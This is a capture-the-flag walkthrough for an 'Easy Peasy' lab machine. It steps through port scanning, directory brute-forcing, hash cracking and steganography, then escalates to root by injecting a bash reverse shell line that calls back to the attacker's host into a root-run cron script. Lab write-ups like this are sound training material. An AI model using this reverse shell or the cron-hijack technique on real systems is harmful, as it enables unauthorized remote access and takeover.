# Easy Peasy

- How many ports are open?

	- `nmap <TARGET_IP>`
	- `3`

- What is the version of nginx?

	- `nmap -sV <TARGET_IP>`
	- `1.16.1`

- What is running on the highest port?

	- `apache`

- Using GoBuster, find flag 1.

	- `gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
	- We find `/hidden`.
	- Go in depth. `gobuster dir -u http://<TARGET_IP>/hidden/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
	- We find `/whatever`
	- Inspect page source.
	- `ZmxhZ3tmMXJzN19mbDRnfQ==`
	- `echo -n ZmxhZ3tmMXJzN19mbDRnfQ== | base64 -d`
	- `flag{f1rs7_fl4g}`

- Further enumerate the machine, what is flag 2?

	- I remember you there is another server public exposed. Go to `http://<TARGET_IP>:65524`.
	- With the same previous command of gobuster we can see there is a robots.txt file.
	- `a18672860d0510e5ab6699730763b250`
	- `hash-identifier`
	- Just search on google
	- `flag{1m_s3c0nd_fl4g}`

- Crack the hash with easypeasy.txt, What is the flag 3?

	- Inspect source code of default Apache page.
	- `flag{9fdafbd64c47471a8f54cd3fc64cd312}`

- What is the hidden directory?

	- Looking at the second server (apache) index page source code I found `its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu`.
	- Play a bit with CyberChef.
	- `/n0th1ng3ls3m4tt3r` (base62).
	
- Using the wordlist that provided to you in this task crack the hash
what is the password?

	- Go to this directory with a browser and inspect source code.
	- `940d71e8655*********8ab85066**********418**********83e7f5fe6*d81`
	- `hash-identifier`
	- `john --wordlist=easypeasy.txt --format=gost hash.txt`
	- `mypass*************`

- What is the password to login to the machine via SSH?

	- Download the central image on the page (`http://<TARGET_IP>:65524/n0th1ng3ls3m4tt3r`)
	- `steghide extract -sf binarycodepixabay.jpg` and enter the password.
	- In the new file you will have a username and a binary password.
	- Just convert to text the binary code.
	- `***********************binary`

- What is the user flag?

	- Login into ssh (not port 22, remember the output of nmap).
	- `cat user.txt`
	- This isn't the real flag. Just use ROT13.
	- `flag{n0wi************}`

- What is the root flag?

	- Try to search something related to cronjob.
	- `cat /etc/crontab`
	- uuuuuuuuh `/var/www/.mysecretcronjob.sh`
	- This code will be executed as root, so:
	- Insert this on that file: `/bin/bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1`
	- On your machine `nc -lnvp 4444`
	- `cat /root/flag.txt` ......
	- wat?
	- oH. Ok. `cat /root/.root.txt`
	- `flag{63a**0e******05079**********1845}`





